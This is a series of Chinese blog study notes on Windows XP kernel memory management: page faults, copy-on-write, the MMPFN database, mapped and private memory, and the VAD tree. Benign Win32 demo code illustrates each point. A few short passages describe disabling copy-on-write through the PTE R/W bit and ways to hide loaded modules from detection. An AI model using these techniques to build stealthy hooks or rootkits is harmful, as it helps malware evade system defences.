当在申请的线性地址处写入数据后，再看这个线性地址对应的PTE时会发现，此时PTE已经有值，并且指向一个物理页。同样，这也是利用了缺页异常的机制。当CPU访问线性地址的时候，发现PTE的值是0，此时触发了无效PTE中的第四种情况（未知原因，需检查VAD），这个时候，操作系统会查看当前进程的Vad树，如果线性地址存在，就会给线性地址挂上一个物理页，并填写PTE的12-31位，1-9位，将P位置1；如果线性地址不存在，就会报0xC0000005错误。 结论：通过实验了解到在申请内存时即使令参数flAllocationType的值为MEM_COMMIT，也不是立刻获得物理页，而是在使用内存时，通过触发缺页异常，从而获得物理页。至于MEM_RESERVE，在Vad树中会显示Commit的值为0。 写拷贝原理在映射内存一篇中介绍过写拷贝，本篇就来分析一下写拷贝的实现原理。 通过之前的学习了解到，PTE属于物理内存的范畴，Vad树属于线性地址的范畴，而写拷贝的实现同时借助了两者的属性。下面来看具体步骤： 当一个进程试图对受到写拷贝保护的文件进行写操作的时候，操作系统会先检查PTE的R/W属性。 受到写拷贝保护的文件，其物理页所在PTE的R/W属性被设置为只读(0)。 当操作系统检测到进程尝试向只读的物理页写入数据时，会触发异常，转入异常处理函数中执行。 异常处理函数会查找进程的Vad树，发现该文件的内存保护属性为写拷贝。 此时操作系统会创建一份新的物理页，并将源文件的内容拷贝一份到新的物理页中，让试图修改文件的进程中映射的文件指向这个新的物理页。 这样进程修改的文件只是一个副本，而不是真正修改源文件。 精简版可参考下图： 过掉写拷贝保护的方式也比较简单，直接修改PTE的属性，令R/W置1。 总结至此，内存部分就基本结束了，主要介绍了线性地址与物理内存的管理与分配，以及缺页异常这种常见机制的介绍，更多内容可以学习潘爱民老师的《Windows内核原理与实现》这里就不再展开。 参考资料参考书籍： 《Windows内核原理与实现》p250~265 —— 潘爱民 参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83757538 （My classmates缺页异常学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"物理内存的管理","slug":"物理内存的管理","date":"2020-09-03T06:02:25.000Z","updated":"2022-05-17T15:31:02.299Z","comments":true,"path":"2020/09/03/物理内存的管理/","link":"","permalink":"http://cata1oc.github.io/2020/09/03/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%9A%84%E7%AE%A1%E7%90%86/","excerpt":"","text":"前言前面3篇文章，以线性地址的角度认识了地址空间的管理与分配；本篇则以物理内存的角度来看地址的管理情况，在介绍段、页时，学习了不少关于页的知识，也有必要作为参考： 10-10-12分页 PDE-PTE属性 页目录表、页表基址 基址小实验(10-10-12) 逆向分析MmIsAddressValid(10-10-12) 2-9-9-12分页 认识物理内存最大物理内存 10-10-12分页：最多可识别物理内存为4GB 2-9-9-12分页：最多可识别物理内存为64GB 操作系统限制为什么在XP中，明明是2-9-9-12分页，却仍然无法超越4GB呢？ 在内核函数中，有一个函数MmAddPhysicalMemoryEx，它调用了一个ExVerifySuite函数，这个ExVerifySuite限制了操作系统无法识别超过4GB，这里不展开，感兴趣可以自行分析它。（网上有补丁可以突破4GB的限制，原理也就是对这个函数做手脚） 实际物理内存如何来看实际的物理内存的大小。它可以通过任务管理器来查看，如图： 可以看到，这里的值是523696（10进制），单位是KB，这是操作系统实际管理出来的物理内存。 还有另一种方式，通过全局变量MmNumberOfPhysicalPages，如下图所示： 全局变量MmNumberOfPhysicalPages记录了物理页的总数，单位是4KB，通过运算，可以看到，刚好就是任务管理器中查询到的值。 空闲页的管理学习物理内存的管理，分为两个角度，一是空闲页的管理，另一个是活动状态页的管理。这部分主要介绍空闲页的管理机制。 全局数组在操作系统中，有一个全局数组，数组中的成员记录了所有的物理页的信息（包括空闲页与正在使用的页），描述如下： Code12数组指针：_MMPFN* MmPfnDatabase数组长度：MmNumberOfPhysicalPages 如图，框住的地址指向一个MMPFN结构，MMPFN是一个用来描述物理页的信息的结构，其大小为0x1C（或者0x18，因系统环境不同可能会变化），不过MMPFN结构本身并没有记录自己描述的是哪个物理页的信息，那么如何找到某个MMPFN描述的是哪个物理页呢？ 微软用了一种很巧妙的办法解决了这个问题。前面提到MmNumberOfPhysicalPages存的物理页的总数，而每个MMPFN用来描述一个物理页，因此就让每个物理页与全局数组中每个MMPFN按照顺序一一对应起来。以图中的MMPFN为例： 0x80c8600+0x1c*0：指向全局数组中第一个MMPFN，描述所有物理页中第一个物理页（0x0000~0x0fff） 0x80c8600+0x1c*1：指向全局数组中第二个MMPFN，描述所有物理页中第二个物理页（0x1000~0x1fff） 0x80c8600+0x1c*2：指向全局数组中第三个MMPFN，描述所有物理页中第三个物理页（0x2000~0x2fff） ……以此类推 数组成员前面一直提到全局数组中的成员——MMPFN结构，它被用来描述一个物理页的信息，现在来看看这个结构各个字段的含义： c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758kd> dt _MMPFNnt!_MMPFN +0x000 u1 : __unnamed +0x004 PteAddress : Ptr32 _MMPTE +0x008 u2 : __unnamed +0x00c u3 : __unnamed +0x010 OriginalPte : _MMPTE +0x018 u4 : __unnamedtypedef struct _MMPFN{ union { PFN_NUMBER Flink; ULONG WsIndex; //该页面在进程工作集链表中的索引 PKEVENT Event; NTSTATUS ReadStatus; SINGLE_LIST_ENTRY NextStackPfn; SWAPENTRY SwapEntry; } u1; PMMPTE PteAddress; //执行此页面的PTE的虚拟地址 union { PFN_NUMBER Blink; ULONG_PTR ShareCount; //指向该页面的PTE数量 } u2; union { struct { USHORT ReferenceCount; //代表这个页面必须要保留在内存中的引用计数 MMPFNENTRY e1; }; struct { USHORT ReferenceCount; USHORT ShortFlags; } e2; } u3; union { MMPTE OriginalPte; //包含了指向此页面的PTE的原始内容 LONG AweReferenceCount; PMM_RMAP_ENTRY RmapListHead; }; union { ULONG_PTR EntireFrame; struct { ULONG_PTR PteFrame:25; ULONG_PTR InPageError:1; ULONG_PTR VerifierAllocation:1; ULONG_PTR AweAllocation:1; ULONG_PTR Priority:3; ULONG_PTR MustBeCached:1; }; } u4; //指向该页面的PTE所在的页表页面的物理页帧编号,以及一些标志位 由于MMPFN结构包含了4个共用体，每个共用体又包含多个成员，以至于在不同状态下，该结构成员的含义也有所不同。接下来就来看看物理页有哪些状态。 物理页状态（空闲）_MMPFN.u3.e1处的结构是一个位段，其结构如下： 其中PageLocation这个成员标识了当前物理页的状态，每一种状态对应一个链表，该链表串着所有当前状态的物理页，具体参考下表： 取值 对应的全局链表 状态类型 0 MmZeroedPageListHead 零化 1 MmFreePageListHead 空闲 2 MmStandbyPageListHead 备用 3 MmModifiedPageListHead 修改 4 MmModifiedNoWritePageListHead 已修改但不写出 5 MmBadPageListHead 损坏 下面来解释每种状态及其对应链表的含义： 坏状态（bad）：页面产生硬件错误，系统不再使用这样的页面。 零化状态（zero）：页面是空闲的，不属于任何一个工作集，零化链表串着的每个物理页的内容已经被全部清零。 空闲状态（free）：页面是空闲的，不属于任何一个工作集，但是物理页包含了不确定的数据，系统空闲时有专门的线程从这个队列摘取物理页，加以清零后再挂入零化链表中。 备用状态（standby）：这种页面原来属于某个进程或系统工作集，但现在已经从工作集中移除。这种页面包含的数据对于原来的工作集仍然是有效的，原来工作集中的PTE仍然指向该页面，但是已被标记成正在转移的无效PTE。是导致缺页异常的主要因素之一。 已修改状态（modified）：类似于备用状态，已经从原来的工作集中移除，但是页面包含的内容已经被修改过。原来工作集中的PTE仍然指向物理页面，但是已被标记成正在转移的无效PTE。如果系统要把这种页面回收作它用，则必须将其中的内容写到磁盘上。 已修改但不写出（modified no-write）：类似于已修改状态，但区别在于，内存管理器不会将它的内容写到磁盘上。 查询链表实验我们现在知道了，所有物理页，都在一个全局数组里，每个物理页对应一个MMPFC物理页描述结构，空闲的物理页有6种状态，每种状态对应一个全局链表，那么如何把这些知识点串起来呢，下面以一个实验来巩固以上知识，以零化链表为例，查询该链表上所有物理页： 首先根据全局变量，找到描述物理页信息的MMPFN全局数组 框住的就是所有物理页中第一个物理页对应的MMPFN。通过该地址+0x1c*下标，可以找到任一物理页。 然后通过全局变量MmZeroedPageListHead查找零化链表 这个零化链表怎么看呢，这要参考下面这个关于各个状态的链表结构（注意，这里是各个状态对应的链表结构，不是各个状态对应的MMPFN结构，来源自WRK） c1234567MMPFNLIST MmZeroedPageListHead = {0, ZeroedPageList, LIST_HEAD, LIST_HEAD};MMPFNLIST MmFreePageListHead = {0, FreePageList, LIST_HEAD, LIST_HEAD};MMPFNLIST MmStandbyPageListHead = {0, StandbyPageList, LIST_HEAD, LIST_HEAD};MMPFNLIST MmModifiedPageListHead = {0, ModifiedPageList, LIST_HEAD, LIST_HEAD};MMPFNLIST MmModifiedNoWritePageListHead = {0, ModifiedNoWritePageList, LIST_HEAD, LIST_HEAD};MMPFNLIST MmBadPageListHead = {0, BadPageList, LIST_HEAD, LIST_HEAD};MMPFNLIST MmRomPageListHead = {0, StandbyPageList, LIST_HEAD, LIST_HEAD}; 这个是WRK中定义的各个链表的结构，我们这里关注零化链表，可以注意到，它的第三个成员和第四个成员都是LIST_HEAD，区别在于，一个是从前往后数，另一个是从后往前数。 以第三个成员为例，将其代入，观察下图： 这个图是理解各个状态链表如何将物理页串起来的核心，看懂了就都明白了。它很复杂，我第一遍看的时候也是半天没搞懂，这里把关键的要素都框住了，看上去会方便很多，下面来逐个进行讲解： 首先来看红色方框，第一个红框是全局数组的首地址（指向第一个物理页对应的MMPFN结构），第二个红框是零化链表中第一个零化物理页对应的MMPFN结构的下标，这个如何理解呢，需要结合橙色方框来看。 看到第一个橙色方框，这里用全局数组首地址+第一个零化物理页下标*MMPFC结构的大小。得到的就是第一个零化物理页对应的MMPFN结构。现在就可以理解了，零化链表中LIST_HEAD是什么含义，它就是当前零化物理页的MMPFN结构在全局数组中的下标。该下标*4KB，得到是就是该零化物理页对应的地址了。 前两步，都好理解，到了蓝色方框，这里使用了第二个橙色方框的值，作为下标进行运算。要解释这一步，需要重新审视MMPFN结构。 观察MMPFN，前面说过由于MMPFN使用了大量的共用体，导致它在不同状态下，所代表的含义也是不同的，而此时，当MMPFN指向一个零化物理页时，u1与u2共用体采用的值分别是Flink与Blink，分别指向前一个零化物理页在全局数组中的下标与后一个零化物理页在全局数组中的下标。按照前一张图中的规律，就可以得出下图： 这张图就可以很好的描述全局数组，零化链表与MMPFN的对应关系。 小结至此，以一个零化链表的查询例子，了解了全局数组，零化链表与其对应的MMPFN之间的关系，但是仅限用于零化状态的物理页，其余状态的物理页与MMPFN的对应关系如下： 当然这里面也包括了活动状态页对应的MMPFN。 活动页的管理这部分海哥讲到的不多，可以参考《Windows内核原理与实现》p286~293，简单说一下吧。 这张图是Windows10系统任务管理器中查看到的，在性能一栏，打开资源监视器，可以看到有工作集这么一栏，这里记录的是进程实际使用的物理页总大小。 任意打开一个进程，定位到进程结构体0x1f8的位置，有一个Vm成员，是MMSUPPORT结构 MMSUPPORT结构体中，VmWorkingSetList记录了与当前进程相关的工作集信息。VmWorkingSetList对应的结构体MMWSL内部还有一个Wsle成员，用来描述一个有效页面。这部分具体参考《Windows内核原理与实现》p286~287。 参考资料参考书籍： 《Windows内核原理与实现》p265~293 —— 潘爱民 参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83751896 （My classmates-物理内存的管理学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Mapped Memory","slug":"Mapped-Memory","date":"2020-09-01T08:28:26.000Z","updated":"2022-05-17T15:30:33.699Z","comments":true,"path":"2020/09/01/Mapped-Memory/","link":"","permalink":"http://cata1oc.github.io/2020/09/01/Mapped-Memory/","excerpt":"","text":"前言前一个学习私有内存（Private Memory），本篇学习与之相对的映射内存（Mapped Memory），回顾之前见到过的进程Vad树，会发现Mapped Memory总是占据绝大部分。 仅有少数，例如存储函数与局部变量的栈，malloc申请的堆，属于私有内存，其它情况下，大部分都是映射内存，这也归功于映射内存的优点所致，映射内存可以节约内存资源，更有效率的使用内存。 映射内存主要函数映射内存主要有两类应用场景，一种是共享物理页，另一种是共享文件。下面来看一下与映射内存相关的主要函数。 CreateFileMapping这两类都离不开申请映射内存的核心函数：CreateFileMapping，它的作用是在底层准备好一个物理页/文件，下面是函数原型： c12345678HANDLE CreateFileMapping( HANDLE hFile, //物理文件句柄 LPSECURITY_ATTRIBUTES lpAttributes, //安全设置 DWORD flProtect, //保护设置 DWORD dwMaximumSizeHigh, //高位文件大小 DWORD dwMaximumSizeLow, //低位文件大小 LPCTSTR lpName //共享内存名称); 简要介绍一下参数： hFile：文件句柄，用于共享文件时此处填写文件名；用于共享物理页时，此处填写INVALID_HANDLE_VALUE。 lpAttributes：安全设置，通常设置NULL，使用默认的安全配置。 flProtect：设置内存保护属性，例如READWRITE，READONLY之类的。取值如下： Code12345常数： 1.PAGE_READONLY 2.PAGE_READWRITE 3.PAGE_WRITECOPY 4.PAGE_EXECUTE_READ 5.PAGE_EXECUTE_READWRITE可组合使用常数： 1.SEC_COMMIT 2.SEC_IMAGE 3.SEC_RESERVE dwMaximumSizeHigh：通常BUFSIZ，该值似乎是FILE默认的buf大小，在头文件“stdlib.h”中定义。 lpName：共享内存的名称，想要和另一个进程共享一块内存时，另一个进程必须知道这块内存是什么，这个参数就是描述这块内存的名称。 返回值：如果执行成功，返回映射对象（物理页/文件）的句柄。 MapViewOfFile除了CreateFileMapping外，另一个函数MapViewOfFile也相当重要，CreateFileMapping只是在底层准备好一个物理页/文件，想将准备好的物理页/文件与当前进程关联起来，就要依赖MapViewOfFile函数，其原型如下： c1234567LPVOID WINAPI MapViewOfFile( __in HANDLE hFileMappingObject, __in DWORD dwDesiredAccess, __in DWORD dwFileOffsetHigh, __in DWORD dwFileOffsetLow, __in SIZE_T dwNumberOfBytesToMap); hFileMappingObject：CreateFileMapping函数返回的映射对象句柄。 dwDesiredAccess：映射对象的文件数据的访问方式，要与CreateFileMapping中设置的内存保护属性（flProtect）相匹配。取值如下： Code123456dwDesiredAccess取值 (flProtect对应的值) 1.FILE_MAP_ALL_ACCESS (PAGE_READWRITE) 2.FILE_MAP_COPY (PAGE_WRITECOPY) 3.FILE_MAP_EXECUTE (PAGE_EXECUTE_READ/PAGE_EXECUTE_READWRITE) 4.FILE_MAP_READ (PAGE_READONLY/PAGE_READWRITE) 5.FILE_MAP_WRITE (PAGE_READWRITE) dwFileOffsetHigh：通常填0。 dwFileOffsetLow：通常填0. dwNumberOfBytesToMap：映射文件的字节数。 返回值：如果执行成功，返回映射物理页/文件的开始地址值。 OpenFileMapping在已经CreateFileMapping准备好一个物理页/文件后，想要使用这个文件，就不需要再次创建了，通过调用另一个函数OpenFileMapping，就能够获取到该物理页/文件的句柄。进而可以将这个物理页/文件映射到当前内存上。函数原型如下： c12345HANDLE OpenFileMappingA( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName); dwDesiredAccess：同MapViewOfFile。 bInheritHandle：如这个函数返回的句柄能由当前进程启动的新进程继承，则这个参数为TRUE，通常填FALSE。 lpName：同CreateFileMapping。 返回值：如果执行成功，返回映射对象（物理页/文件）的句柄。 共享物理页申请映射内存在了解了映射内存的两个关键函数后，下面用一个申请映射内存的实验加深印象。 原理：通过CreateFileMapping函数在底层准备好一个用于共享的物理页，调用MapViewOfFile将物理页与当前进程关联起来。 编译运行如下代码（平台：Windows XP，编译器：VC++6.0） c1234567891011121314151617181920#include \"stdafx.h\"#include \"windows.h\"int main(int argc, char* argv[]){ printf(\"申请映射内存之前\\n\"); getchar(); //准备物理页 HANDLE hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, BUFSIZ, \"共享内存\"); //将物理页与线性地址进行映射 LPTSTR lpBuff = (LPTSTR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUFSIZ); *(PDWORD)lpBuff = 0x12345678; printf(\"A进程写入地址 - 内容：%p - %x \", lpBuff, *(PDWORD)lpBuff); getchar(); return 0;} 运行程序，在申请映射内存之前，进入Windbg，记录下进程当前Vad树的情况 等申请完映射内存之后，再观察该进程的Vad树 可以看到多出了一个起始位置为0x3a0000，大小为1个物理页的映射内存。这验证了CreateFileMapping也可以申请内存。 共享资源映射内存的一大特点，就是它可以通过共享物理页实现共享资源，从而节省不少内存资源，来看接下来这个实验。 首先是刚刚的代码，运行后，可以看到，A进程在0x3a0000处写入数据0x12345678 接着创建一个新的文件（不要关掉之前的进程），编写如下代码： c1234567891011121314151617#include \"stdafx.h\"#include \"windows.h\"int main(int argc, char* argv[]){ printf(\"读取物理页前\\n\"); getchar(); HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, \"共享内存\"); LPTSTR buffer = (LPTSTR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUFSIZ); printf(\"B进程读取：%x\", *(PDWORD)buffer); getchar(); return 0;} 尝试在另一进程中，访问前一个实验创建的物理页。 运行程序，在读取物理页前，停下来，查看该进程的Vad树 可以发现，此时还未读取物理页时，0x3a0000处的内存节点并不在当前进程的Vad树中。 继续运行代码，并再次查看进程的Vad树 可以看到，在新起的进程中，多了0x3a0000处的一个内存节点，大小是一个物理页，并且这块内存是Mapped类型；此外，运行结果也可以看出，我们成功读取出了在另一个进程中存进去的数据。也就是说此时两个进程的内存空间中，都有0x3a00000处这个映射内存节点。 这样就能理解清楚映射内存是怎么回事了，一个进程在底层准备了一个物理页（也可以多个），此时物理页并不可被使用，但是任意进程，只要获得了该物理页的句柄，就可以将其映射到自己的内存空间中，也就可以使用该内存了，例如存储数据或者读取数据（依据创建物理页时设置的属性）。这样也就实现了资源共享。 共享文件共享文件实验有了共享资源的基础，再来看共享文件，就容易的多。与共享资源相比，就是多了一步，需要先获取文件句柄（例如创建或者打开一个文件），接下来的步骤与共享资源是一样的。这里直接上代码： c12345678910111213141516#include \"stdafx.h\"#include \"windows.h\"int main(int argc, char* argv[]){ //这里创建一个文件 HANDLE hFile = CreateFile(\"C:\\\\abc.txt\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //后面的步骤与共享资源一样，注意CreateFileMapping的第一个参数 HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, BUFSIZ, NULL); LPTSTR lpBuff = (LPTSTR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, BUFSIZ); printf(\"%x\", lpBuff); getchar(); return 0;} 这里就不分P了，直接看结果。 可以看到当前进程通过映射文件的方式共享了一个刚刚创建的txt文件。共享文件的主要好处是能够分享处理大文件，从而减少大文件的反复加载内存与拉伸，节省不必要的资源开支。需要注意一点，如果有一个进程修改了该共享文件，那么所有使用该共享文件的进程都会被影响。 文件写拷贝通过前面几个实验，多次观察进程的Vad树，可能会发现一点，就是有几个映射文件，有点与众不同。 可以看到，框出的这几个映射文件，多出一个Exe的属性，并且这几个文件的内存保护属性都是EXECUTE_WRITECOPY。它有什么用呢？来看下面一个实验，编写如下代码： c1234567891011#include \"stdafx.h\"#include int main(int argc, char* argv[]){ //这里我从System32文件夹下复制了一个notepad.exe到磁盘C目录下，任选一个dll也可以 HANDLE hModule = ::LoadLibrary(\"C:\\\\notepad.exe\"); getchar(); return 0;} 运行代码后，观察进程的Vad树，会发现notepad.exe也有了与刚刚几个映射文件相同的属性。 结论： LoadLibrary函数底层实现，就是利用了映射文件的机制，实现的共享文件。 LoadLibrary加载的映射文件，会具备EXECUTE_WRITECOPY内存保护属性 EXECUTE_WRITECOPY用来防止映射文件被其它进程修改，当一个进程试图修改映射文件时，若该文件的内存保护属性是EXECUTE_WRITECOPY，那么操作系统会让该进程指向一个新的物理页，新的物理页存着映射文件的副本，这样进程试图对映射文件修改时就不会影响到真正的映射文件。此等保护机制，可用于防止对系统函数Hook等手段。 关于模块隐藏这段时间，反复接触了一个结构，就是Vad树。之前，在学习进程结构体的时候，有一个模块隐藏的思路就是通过断链的方式，使得操作系统无法通过进程结构体找到其所加载的模块，但是，有了Vad树后，进程的内存空间，一目了然，加载的模块都逃不掉。所以说，断链只是一个表面上的模块隐藏，仅能够骗骗3环API。 如果考虑删除Vad树上的节点，实现模块隐藏，则是更加不现实的，这样很容易造成程序出问题，因为操作系统是根据Vad树判断当前进程是否占用了这块内存，如果删除了Vad树上的节点，当别的进程使用VirtualAlloc申请内存时，就有可能申请到你原来隐藏模块的内存，这样程序运行就会出错了。 有一种极为困难的办法，就是自己申请内存，拉伸文件，添加PE头。将模块融入代码中，这样的话，就很难检测出来，仅有通过内存搜索方式，才能找到。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83722047 （My classmates-线性地址的管理学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Private Memory","slug":"Private-Memory","date":"2020-08-31T07:11:39.000Z","updated":"2022-05-17T15:29:50.023Z","comments":true,"path":"2020/08/31/Private-Memory/","link":"","permalink":"http://cata1oc.github.io/2020/08/31/Private-Memory/","excerpt":"","text":"前言对于内存空间有两种描述方式，一种是物理内存的角度，所有地址只分为两类，挂了物理页的地址与没有挂物理页的地址，其属性由PDE/PTE决定。另一种是线性地址的角度，分为私有内存与映射内存。前者，在介绍段、页时已有了解，近来这几篇主要是从线性地址的角度，来学习内存空间。本篇就来学习其中的一种类型，私有内存。 私有内存与映射内存在前一篇用指令打印Vad树时，可以看到，同一个进程中，就存在私有内存（Private）与映射内存（Mapped）两种类型的内存空间。 这两类内存的区别主要有2点不同： 申请内存的方式不同： 私有内存：通过VirtualAlloc/VirtualAllocEx申请的。 映射内存：通过CreateFileMapping映射的。 使用方式不同： 私有内存：独享物理页。 映射内存：可能要与其它进程共享物理页。 VirtualAlloc函数原型本篇主要介绍私有内存，就先从它的申请内存函数开始。首先是VirtualAlloc的函数原型： c123456LPVOID VirtualAlloc{ LPVOID lpAddress, // 要分配的内存区域的地址 DWORD dwSize, // 分配的大小 DWORD flAllocationType, // 分配的类型 DWORD flProtect // 该内存的初始保护属性}; 这4个参数都挺重要的，除注释外，再额外介绍一下： lpAddress：申请内存地址，自然要有起点，终点，这个参数就是指申请地址的起点。结合第二个参数dwSize，例如申请起始地址0x123000，大小0x1000，那么就会给你分配0x123000~0x123fff这个物理页。但是如果这块内存已经被占用了，自然就无法申请了，由于需要查找Vad树才能知道这块地址是否被占用，过程较为麻烦，因此，通常来说，这个值填NULL，让系统自动去分配一块没被占用的内存地址。 dwSize：就是想要分配的大小，如果提供了lpAddress，那么lpAddress就是地址的起点，lpAddress+dwSize-1就是地址的终点。这个值必须是0x1000（4KB，即一个物理页）的整数倍。 flAllocationType：分配的类型，有两种： MEM_COMMIT：创建节点并分配物理页。 MEM_RESERVE：只创建节点，不分配物理页。 flProtect：内存的初始保护属性，例如READWRITE，READONLY这样的。 与VirtualAllocEx的差异还有一个类似的函数VirtualAllocEx，参数什么的都和VirtualAlloc一样，唯一不同的VirtualAllocEx可以跨进程申请内存，VirtualAlloc只能在当前进程中申请内存。 VirtualAlloc实验下面用一个实验来了解VirtualAlloc申请内存的过程： 编译运行如下代码（环境：Windows XP，编译器：VC++6.0） c1234567891011121314#include \"stdafx.h\"#include int main(int argc, char* argv[]){ printf(\"申请内存前\\n\"); getchar(); LPVOID address = VirtualAlloc(NULL, 0x3000, MEM_COMMIT, PAGE_READWRITE); printf(\"内存地址：%X\\n\", address); getchar(); return 0;} 第一次运行时，会在第一个getchar()处停下，此时进入Windbg查看当前进程的Vad树 在用VirtualAlloc函数申请完内存后，再来观察Vad树，情况就有些不一样了 可以看到，在执行完VirtualAlloc后，0x3a0000~0x3a2fff处新分配了一个大小为0x3000的内存空间，这在执行前是没有的，同时Vad树的总结点树也增加了1。同时新分配的内存空间，属性也是对应了VirtualAlloc的各个参数。 这样，使用VirtualAlloc函数申请内存的过程就好理解了，它会在低2G中，还没有使用的内存空间中，分配一个指定大小的私有内存空间，然后将其对应的_MMVAD结构添加到创建它进程的Vad树中。 堆与栈malloc与new文章开头提到，对于以线性地址为角度描述内存时，分为私有内存与映射内存。申请私有内存的函数为VirtualAlloc/VirtualAllocEx，申请映射内存的函数为CreateFileMapping。那么问题了，曾经我们在C语言中学习到的malloc函数，与C++中学习的new函数，难道就不能申请内存吗。这部分，就来讨论一下这个问题。 在初级班，海哥曾经说过malloc与new的底层调用过程，具体如下： Code1malloc -> _nh_malloc_dbg -> _heap_alloc_dbg -> _heap_alloc_base -> HeapAlloc Code1new -> _nh_malloc -> _nh_malloc_dbg -> _heap_alloc_dbg -> _heap_alloc_base -> HeapAlloc 可以看到，malloc和new本质都是一样的，底层都调用了HeapAlloc这么一个函数。接下来就来看看这个函数。 HeapAlloc与堆HeapAlloc作用是在堆中分配内存的一个函数，但是它真正申请内存了吗？其实并没有，HeapAlloc函数甚至没有进入0环，一个没有进入0环的函数，它自然没有权限去申请内存。既然没法申请内存，那么HeapAlloc又是如何在堆中分配内存的呢？ 这里就要了解一下堆的概念，什么是堆呢？堆其实就是操作系统通过调用VirtualAlloc函数预先分配好的一大块内存。HeapAlloc的作用就是在这一大块已经预先分配好的内存里面，分一些小份出来用。作个比喻，可以认为VirtualAlloc就是批发市场，一次必须批量从操作系统那里购买内存，必须是4KB的整数倍才可以；而HeapAlloc就是零售商，从VirtualAlloc已经批来的货里面（堆）买一部分走。 栈前面说到堆是OS调用VirtualAlloc预先分配好的一块内存，那么栈是什么呢？栈其实和堆一样，也是预先分配好的内存，但是栈甚至不需要HeapAlloc分配，就可以直接使用。最常见的，就是局部变量了。参考接下来的实验。 堆栈实验下面就来做一个实验，观察进程是如何使用堆，栈的空间的。 编译运行如下代码（环境：Windows XP，编译器：VC++6.0） c123456789101112131415161718#include \"stdafx.h\"#include int z = 0x6666;int main(int argc, char* argv[]){ int x = 0x12345678; int* y = (int*)malloc(sizeof(int)*128); printf(\"栈:%x \\n\",&x); printf(\"堆:%x \\n\",y); printf(\"全局变量：%x\\n\", &z); getchar(); return 0;} 运行后，分别打印全局变量的地址，局部变量的地址，以及malloc申请的内存首地址。 然后分别在局部变量初始化前后，以及malloc调用前后，观察Windbg中查看当前进程的Vad树 会发现，无论是全局变量，局部变量，或者调用malloc函数，它都没有分配新的内存空间，只不过是使用了当前进程已有的内存空间。 不过还是有几个需要说明一下，比如局部变量的地址是0x12ff7c，而它所在的内存块的范围是0x3000~0x12ffff，主要原因是，栈是从高地址向低地址延申的，因此刚开始使用的地址都是当前内存块的高地址。堆的话，就是直接使用了一块已有的内存，可以回想之前批发商与零售商的例子。全局变量，就比较与众不同了，它映射了当前进程的.exe文件，这部分下篇学习映射内存时会讲到。 总结 VirtualAlloc/VirtualAllocEx是申请私有内存的唯一方式。 new与malloc的内部调用是HeapAlloc，HeapAlloc不会进入0环，也不会申请内存，仅能分配一些已经经过VirtualAlloc/VirtualAllocEx申请好的内存。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83722047 （My classmates-线性地址的管理学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"线性地址的管理","slug":"线性地址的管理","date":"2020-08-30T14:26:51.000Z","updated":"2022-05-17T15:29:28.338Z","comments":true,"path":"2020/08/30/线性地址的管理/","link":"","permalink":"http://cata1oc.github.io/2020/08/30/%E7%BA%BF%E6%80%A7%E5%9C%B0%E5%9D%80%E7%9A%84%E7%AE%A1%E7%90%86/","excerpt":"","text":"前言本篇开始，进一步学习与物理页相关的内存管理知识。关于页的知识，在介绍段、页时已学习过一部分基础，可以参考以下链接： 10-10-12分页 PDE-PTE属性 页目录表、页表基址 基址小实验(10-10-12) 逆向分析MmIsAddressValid(10-10-12) 2-9-9-12分页 进程空间的地址划分进程空间地址的划分这个我们已经比较熟悉了，以x86为例，就是对4GB内存空间的划分，可以参考下面两张图： 说明： 线性地址有4GB，但未必都能访问。这个之前也学习过，由于一些地址没有挂物理页，因此无法访问。 有些地址可以访问，有些不能访问，有些具有特定权限才能访问，这些性质都需要被记录，那么Windows系统是如何分配，管理这些内存的呢？这就本篇要学习的主题，线性地址的管理。 内核空间的地址管理内核空间，也就是我们常说的高2G，内核空间的地址是通过链表串起来的，遍历链表便可以找到各片地址的属性。之所以使用链表，主要是依据不同进程的高2G地址往往是相同的，因此高2G的地址变化较少，使用链表足矣。相比之下，用户空间的地址管理就较为复杂，这也是本篇主要讨论的内容。 用户空间的地址管理搜索二叉树与内核空间的地址使用链表串起来所不同的是，用户空间的地址通过一颗搜索二叉树来记录。它里面的每一个节点都记录了一块被占用的线性地址空间。 在Windows XP（32位）系统中任意打开一个进程，本篇以打开Dbgview为例。 找到Dbgview对应的EPROCESS结构体，定位到+0x11c处，有一个VadRoot成员，这个成员就是记录当前进程线性地址空间的搜索二叉树。其对应的地址，则是二叉树根节点的地址。 _MMVAD_MMVAD是搜索二叉树节点的数据类型，根据MMVAD中的成员（ReactOS与Xp有所不同），可以对这个节点所对应的线性地址区域有个整体上的认识，以根节点为例： 这里介绍部分本篇中涉及到的成员： StartingVpn：当前节点对应的内存的线性地址起始位置（以页为单位），本例中为0xab0000。 EndingVpn：当前节点对应的内存的线程地址结束位置（以页为单位），本例中为0xab0000。说明当前节点对应的内存大小为1个物理页，从线性地址0xab0000开始到线性地址0xab0fff结束。 Parent：父节点地址，本例中根节点没有父节点，所以为空。 